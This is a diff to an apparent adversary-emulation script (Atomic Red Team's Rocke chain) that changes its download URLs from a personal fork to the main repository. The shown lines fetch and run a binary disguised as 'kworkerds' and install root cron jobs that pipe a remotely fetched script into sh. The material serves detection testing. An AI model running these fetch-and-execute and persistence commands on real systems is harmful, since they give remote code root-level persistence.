@@ -52,7 +52,7 @@ function b() {
 
     #   Tactic: Defense Evasion
     #   Technique: T1036 - Masquerading
-    (curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -o /var/tmp/kworkerds||wget https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds
+    (curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -o /var/tmp/kworkerds||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds
     nohup /var/tmp/kworkerds >/dev/null 2>&1 &
 
     echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part B" >> /tmp/atomic.log
@@ -66,11 +66,11 @@ function a() {
 
     #   Tactic: Persistence
     #   Technique: T1168 - Local Job Scheduling
-	echo -e "*/10 * * * * root (curl -fsSL https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /etc/cron.d/root
+	echo -e "*/10 * * * * root (curl -fsSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /etc/cron.d/root
 	mkdir -p /var/spool/cron/crontabs
-	echo -e "*/31 * * * * (curl -fsSL https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /var/spool/cron/crontabs/root
+	echo -e "*/31 * * * * (curl -fsSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /var/spool/cron/crontabs/root
 	mkdir -p /etc/cron.daily
-	(curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://raw.githubusercontent.com/forensicitguy/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)
+	(curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)
 
     #   Tactic: Defense Evasion
     #   Technique: T1222 - File Permission Modification
